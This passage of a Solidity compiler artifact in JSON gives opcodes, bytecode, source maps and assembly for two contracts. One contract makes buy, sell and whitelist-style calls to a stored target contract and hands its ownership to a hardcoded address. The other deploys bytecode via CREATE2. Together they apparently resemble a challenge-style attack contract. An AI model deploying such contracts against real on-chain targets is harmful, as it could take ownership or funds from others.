0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x35F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x25C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x265 PUSH2 0x3BC JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x273 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x27C PUSH2 0x46F JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x28A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x293 PUSH2 0x64A JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2A1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x2AA PUSH2 0x6F3 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2B8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x2C1 PUSH2 0x79A JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2CF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x2D8 PUSH2 0x868 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2FE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x307 PUSH2 0x87B JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x15 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH2 0x398 JUMPI PUSH1 0x1 PUSH1 0x0 PUSH1 0x15 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH1 0x0 SWAP1 POP PUSH2 0x3B7 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x15 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH1 0x1 SWAP1 POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xE4849B32 PUSH1 0xC8 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x431 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x445 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x45B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xC03646BA ADDRESS PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x50F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x523 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x539 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP POP PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xC03646BA PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x60C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x620 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x636 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA6F2AE3A PUSH1 0x1 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x6B4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x6C8 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x6DF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD56B2889 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x75C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x770 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x786 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xF2FDE38B PUSH20 0x220866B1A2219F40E72F5C628B65D54268CA3A9D PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x84E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x862 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x15 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x51EC819F ADDRESS PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x91B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x92F JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x62A09477 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x99C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x9B0 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 0x49 0xD 0xE0 BALANCE EXTCODESIZE BYTE 0xD7 SWAP6 PUSH17 0xC77AE043CE5FE65F40E32CD15657BE89FD SUB 0x4A 0xB9 0xE5 0x2C 0x24 PUSH5 0x736F6C6343 STOP SDIV GT STOP ORIGIN ",
							"sourceMap": "5234:5537:0:-;;;5263:5146;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;5234:5537;8:9:-1;5:2;;;30:1;27;20:12;5:2;5234:5537:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;:::o;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;:::-;;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100365760003560e01c80632b85ba381461003b578063d13319c4146100a9575b600080fd5b6100676004803603602081101561005157600080fd5b81019080803590602001909291905050506100c7565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6100b1610180565b6040518082815260200191505060405180910390f35b6000606060008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156101615780601f1061013657610100808354040283529160200191610161565b820191906000526020600020905b81548152906001019060200180831161014457829003601f168201915b505050505090506000838251602084016000f590508092505050919050565b60008060405180828054600181600116156101000203166002900480156101de5780601f106101bc5761010080835404028352918201916101de565b820191906000526020600020905b8154815290600101906020018083116101ca575b5050915050604051809103902090509056fea265627a7a7231582061d868efb6f224ae8c36f2a57c1bc8c70922b32b38bbed0a91402ed73da8966a64736f6c63430005110032",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x2B85BA38 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xD13319C4 EQ PUSH2 0xA9 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x67 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x51 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xC7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xB1 PUSH2 0x180 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH1 0x60 PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x161 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x136 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x161 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x144 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP PUSH1 0x0 DUP4 DUP3 MLOAD PUSH1 0x20 DUP5 ADD PUSH1 0x0 CREATE2 SWAP1 POP DUP1 SWAP3 POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x1DE JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x1BC JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 DUP3 ADD SWAP2 PUSH2 0x1DE JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x1CA JUMPI JUMPDEST POP POP SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 KECCAK256 SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 PUSH2 0xD868 0xEF 0xB6 CALLCODE 0x24 0xAE DUP13 CALLDATASIZE CALLCODE 0xA5 PUSH29 0x1BC8C70922B32B38BBED0A91402ED73DA8966A64736F6C634300051100 ORIGIN ",
							"sourceMap": "5234:5537:0:-;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;5234:5537:0;;;;;;;;;;;;;;;;;;;;;;;;10416:243;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;10416:243:0;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;10665:103;;;:::i;:::-;;;;;;;;;;;;;;;;;;;10416:243;10461:7;10477:21;10501:16;10477:40;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;10524:12;10626:4;10615:8;10609:15;10602:4;10592:8;10588:19;10585:1;10577:54;10569:62;;10651:4;10644:11;;;;10416:243;;;:::o;10665:103::-;10703:7;10739:16;10729:27;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;10722:34;;10665:103;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "109800",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"deploy(bytes32)": "infinite",
								"getHash()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "MSTORE"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "MLOAD"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "DUP1"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "PUSH",
									"value": "A20"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "ADD"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "MSTORE"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "DUP1"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "PUSH",
									"value": "9FE"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "DUP2"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "MSTORE"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "ADD"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "PUSH data",
									"value": "4C860F020C00FBFDD70A1107A62BBB12045EAC8DC19C5BF6E8411D5A5D3EFCE8"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "PUSH",
									"value": "9FE"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "SWAP2"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "CODECOPY"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "SWAP1"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "DUP1"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "MLOAD"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "SWAP1"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "ADD"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "SWAP1"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "SWAP3"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "SWAP2"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "SWAP1"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "PUSH [tag]",
									"value": "2"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "JUMP",
									"value": "[in]"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "JUMPDEST"
								},
								{
									"begin": 5263,
									"end": 10409,
									"name": "POP"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "CALLVALUE"
								},
								{
									"begin": 8,
									"end": 17,
									"name": "DUP1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"value": "3"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI"
								},
								{
									"begin": 30,
									"end": 31,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 27,
									"end": 28,
									"name": "DUP1"
								},
								{
									"begin": 20,
									"end": 32,
									"name": "REVERT"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"value": "3"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "POP"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH [tag]",
									"value": "4"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMP"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "tag",
									"value": "2"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMPDEST"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DUP3"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DUP1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SLOAD"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DUP2"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "AND"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "ISZERO"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH",
									"value": "100"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "MUL"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SUB"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "AND"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH",
									"value": "2"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SWAP1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DIV"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SWAP1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "MSTORE"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "KECCAK256"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SWAP1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH",
									"value": "1F"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "ADD"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SWAP1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DIV"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DUP2"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "ADD"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SWAP3"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DUP3"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH",
									"value": "1F"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "LT"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH [tag]",
									"value": "6"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMPI"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DUP1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "MLOAD"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH",
									"value": "FF"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "NOT"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "AND"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DUP4"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DUP1"
								},
								{
